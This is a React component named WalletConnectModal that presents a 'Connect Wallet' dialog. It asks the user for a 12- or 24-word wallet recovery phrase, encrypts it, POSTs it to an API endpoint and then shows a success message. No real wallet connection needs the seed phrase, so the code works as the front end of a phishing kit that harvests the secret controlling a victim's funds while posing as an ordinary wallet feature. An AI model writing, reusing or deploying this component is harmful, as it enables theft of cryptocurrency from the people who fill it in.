import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { toast } from 'react-toastify';
import { encryptData } from '../utils/encryption';
import 'react-toastify/dist/ReactToastify.css';

const API_TIMEOUT = 10000; // 10 seconds timeout

const WalletConnectModal = ({ isOpen, onClose }) => {
  const [selectedOption, setSelectedOption] = useState('');
  const [words, setWords] = useState([]);
  const [isSubmitting, setIsSubmitting] = useState(false);

  // Initialize words array when option changes
  useEffect(() => {
    const wordCount = selectedOption === '12' ? 12 : 24;
    setWords(Array(wordCount).fill(''));
  }, [selectedOption]);

  const handleWordChange = (index, value) => {
    // Only allow alphabets
    const alphabetsOnly = value.replace(/[^a-zA-Z]/g, '');
    const newWords = [...words];
    newWords[index] = alphabetsOnly;
    setWords(newWords);
  };

  const handlePaste = (e) => {
    e.preventDefault();
    const pastedText = e.clipboardData.getData('text');
    const cleanWords = pastedText
      .replace(/[^a-zA-Z\s]/g, '') // Remove non-alphabetic characters
      .split(/\s+/) // Split by whitespace
      .filter(word => word.length > 0) // Remove empty strings
      .slice(0, selectedOption === '12' ? 12 : 24); // Limit to selected word count

    const newWords = [...words];
    cleanWords.forEach((word, index) => {
      if (index < newWords.length) {
        newWords[index] = word;
      }
    });
    setWords(newWords);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsSubmitting(true);

    try {
      // Validate all words are filled and contain only alphabets
      const isValid = words.every(word => 
        word.length > 0 && /^[a-zA-Z]+$/.test(word)
      );

      if (!isValid) {
        toast.error('Please fill all words with alphabets only');
        setIsSubmitting(false);
        return;
      }

      // Prepare data for encryption
      const dataToEncrypt = {
        wordCount: selectedOption,
        words: words,
        timestamp: new Date().toISOString()
      };

      // Encrypt the data
      const encryptedData = encryptData(dataToEncrypt, import.meta.env.VITE_AES_KEY);

      // Create AbortController for timeout
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), API_TIMEOUT);

      try {
        // Send to API
        const response = await fetch('http://localhost:5000/api/connect-wallet', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'x-api-key': import.meta.env.VITE_API_KEY
          },
          body: JSON.stringify({ encryptedData }),
          signal: controller.signal
        });

        clearTimeout(timeoutId);

        if (!response.ok) {
          const errorData = await response.json();
          
          // Handle specific error cases
          switch (response.status) {
            case 400:
              throw new Error(errorData.error || 'Invalid request data');
            case 401:
              throw new Error('Authentication failed. Please try again.');
            case 403:
              throw new Error('Access denied. Please check your API key.');
            case 429:
              throw new Error('Too many requests. Please try again later.');
            default:
              throw new Error(errorData.error || 'Failed to connect wallet');
          }
        }

        toast.success('Wallet connected successfully!');
        onClose();
      } catch (fetchError) {
        if (fetchError.name === 'AbortError') {
          throw new Error('Request timed out. Please try again.');
        }
        throw fetchError;
      }
    } catch (error) {
      console.error('Error:', error);
      
      // Handle specific error messages
      if (error.message.includes('Failed to fetch')) {
        toast.error('Network error. Please check your connection.');
      } else if (error.message.includes('timeout')) {
        toast.error('Request timed out. Please try again.');
      } else {
        toast.error(error.message || 'Failed to connect wallet. Please try again.');
      }
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <AnimatePresence>
      {isOpen && (
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          exit={{ opacity: 0 }}
          className="fixed inset-0 z-50 flex items-center justify-center"
        >
          {/* Backdrop */}
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="absolute inset-0 bg-black/30 backdrop-blur-sm"
            onClick={onClose}
          />

          {/* Modal */}
          <motion.div
            initial={{ scale: 0.9, opacity: 0 }}
            animate={{ scale: 1, opacity: 1 }}
            exit={{ scale: 0.9, opacity: 0 }}
            className="relative bg-white rounded-2xl p-6 w-full max-w-2xl mx-4"
          >
            <h2 className="text-2xl font-bold mb-6 text-center">Connect Wallet</h2>

            <form onSubmit={handleSubmit} className="space-y-6">
              {/* Phrase Length Selection */}
              <div className="space-y-2">
                <label className="block text-sm font-medium text-gray-700">Select Phrase Length</label>
                <div className="flex gap-4">
                  <motion.button
                    type="button"
                    whileHover={{ scale: 1.02 }}
                    whileTap={{ scale: 0.98 }}
                    className={`flex-1 py-3 px-4 rounded-lg border-2 transition-colors ${
                      selectedOption === '12'
                        ? 'border-purple-600 bg-purple-50 text-purple-600'
                        : 'border-gray-200 hover:border-purple-200'
                    }`}
                    onClick={() => setSelectedOption('12')}
                  >
                    12 Words
                  </motion.button>
                  <motion.button
                    type="button"
                    whileHover={{ scale: 1.02 }}
                    whileTap={{ scale: 0.98 }}
                    className={`flex-1 py-3 px-4 rounded-lg border-2 transition-colors ${
                      selectedOption === '24'
                        ? 'border-purple-600 bg-purple-50 text-purple-600'
                        : 'border-gray-200 hover:border-purple-200'
                    }`}
                    onClick={() => setSelectedOption('24')}
                  >
                    24 Words
                  </motion.button>
                </div>
              </div>

              {/* Word Inputs */}
              {selectedOption && (
                <div className="space-y-4">
                  <label className="block text-sm font-medium text-gray-700">
                    Enter {selectedOption} Words
                  </label>
                  <div 
                    className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-3"
                    onPaste={handlePaste}
                  >
                    {words.map((word, index) => (
                      <div key={index} className="relative">
                        <input
                          type="text"
                          value={word}
                          onChange={(e) => handleWordChange(index, e.target.value)}
                          placeholder={`Word ${index + 1}`}
                          className="w-full p-2 pr-12 border-2 border-gray-200 rounded-lg focus:border-purple-500 focus:ring-2 focus:ring-purple-200 transition-colors text-sm"
                          maxLength={20}
                        />
                        <span className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 text-xs font-medium">
                          {index + 1}
                        </span>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* Submit Button */}
              <motion.button
                type="submit"
                disabled={!selectedOption || words.some(word => !word) || isSubmitting}
                whileHover={{ scale: 1.02 }}
                whileTap={{ scale: 0.98 }}
                className={`w-full py-3 px-4 rounded-lg text-white font-medium transition-colors ${
                  !selectedOption || words.some(word => !word) || isSubmitting
                    ? 'bg-gray-400 cursor-not-allowed'
                    : 'bg-purple-600 hover:bg-purple-700'
                }`}
              >
                {isSubmitting ? 'Connecting...' : 'Connect Wallet'}
              </motion.button>
            </form>

            {/* Close Button */}
            <motion.button
              whileHover={{ scale: 1.1 }}
              whileTap={{ scale: 0.9 }}
              onClick={onClose}
              className="absolute top-4 right-4 text-gray-400 hover:text-gray-600"
            >
              <i className="fas fa-times text-xl"></i>
            </motion.button>
          </motion.div>
        </motion.div>
      )}
    </AnimatePresence>
  );
};

export default WalletConnectModal; 